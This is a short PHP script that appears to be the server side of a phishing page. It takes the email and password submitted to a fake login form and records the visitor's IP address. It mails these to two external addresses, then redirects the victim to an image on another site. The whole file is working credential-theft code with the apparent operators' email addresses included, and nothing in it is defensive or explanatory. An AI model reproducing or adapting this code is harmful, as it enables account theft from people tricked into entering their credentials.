<?

$ip = getenv("REMOTE_ADDR");
$message .= "-------- Login Details --------------------------------\n";
$message .= "Email      : ".$_POST['login_email']."\n";
$message .= "Password     : ".$_POST['login_password']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "---------Created H0ye--------------\n";
$recipient = "lisiijia17@gmail.com, omramy_azad@yahoo.com";
$subject = "Hoye";
mail($recipient,$subject,$message,$headers);
	 
	   
		   header("Location: http://www.kanaktrades.com/PHOTO-2019-07-10-11-47-38.jpg");


?>
